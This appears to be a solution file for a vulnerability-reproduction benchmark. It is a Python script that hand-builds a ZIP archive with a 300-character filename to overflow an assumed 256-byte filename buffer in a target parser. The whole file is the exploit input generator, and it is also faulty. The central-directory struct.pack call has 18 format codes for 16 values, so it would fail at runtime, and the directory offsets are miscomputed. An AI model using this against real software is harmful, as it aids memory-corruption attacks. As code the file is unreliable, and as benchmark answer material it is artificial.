import os
import struct
import zipfile
import io
import zlib
import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Create a zip file with a long filename to trigger buffer overflow
        # Filename buffer is 256 bytes, so we need >256 chars
        # Ground-truth length is 3850, but we'll aim for just over 256 to minimize size
        # Using 300 chars for filename to trigger overflow but keep PoC small
        filename = "A" * 300
        
        # Create zip file in memory
        buffer = io.BytesIO()
        
        # Create local file header
        local_header = bytearray()
        local_header.extend(b'PK\x03\x04')  # Signature
        local_header.extend(struct.pack('<HHHHHIII', 
                                        20,  # Version needed to extract (2.0)
                                        0,   # General purpose bit flag
                                        0,   # Compression method (store)
                                        0,   # Last mod file time
                                        0,   # Last mod file date
                                        0,   # CRC32 (will update later)
                                        0,   # Compressed size
                                        0))  # Uncompressed size
        
        # Add filename length and extra field length
        local_header.extend(struct.pack('<HH', len(filename), 0))
        
        # Add filename
        local_header.extend(filename.encode('utf-8'))
        
        # Create file data (minimal)
        file_data = b"X"
        
        # Calculate CRC32
        crc32 = zlib.crc32(file_data) & 0xffffffff
        
        # Update local header with CRC and sizes
        local_header[14:18] = struct.pack('<I', crc32)
        local_header[18:22] = struct.pack('<I', len(file_data))
        local_header[22:26] = struct.pack('<I', len(file_data))
        
        # Create central directory header
        central_header = bytearray()
        central_header.extend(b'PK\x01\x02')  # Signature
        central_header.extend(struct.pack('<BBHHHHHIIIHHHHHIII',
                                          20,  # Version made by
                                          20,  # Version needed to extract
                                          0,   # General purpose bit flag
                                          0,   # Compression method
                                          0,   # Last mod file time
                                          0,   # Last mod file date
                                          crc32,
                                          len(file_data),  # Compressed size
                                          len(file_data),  # Uncompressed size
                                          len(filename),   # Filename length
                                          0,   # Extra field length
                                          0,   # File comment length
                                          0,   # Disk number start
                                          0,   # Internal file attributes
                                          0,   # External file attributes
                                          0))  # Relative offset of local header
        
        # Add filename
        central_header.extend(filename.encode('utf-8'))
        
        # Create end of central directory record
        end_record = bytearray()
        end_record.extend(b'PK\x05\x06')  # Signature
        end_record.extend(struct.pack('<HHHHIIH',
                                      0,   # Disk number
                                      0,   # Disk with start of central directory
                                      1,   # Entries in this disk
                                      1,   # Total entries
                                      len(central_header),  # Size of central directory
                                      len(local_header),    # Offset of central directory
                                      0))  # Comment length
        
        # Combine all parts
        poc = local_header + file_data + central_header + end_record
        
        return bytes(poc)
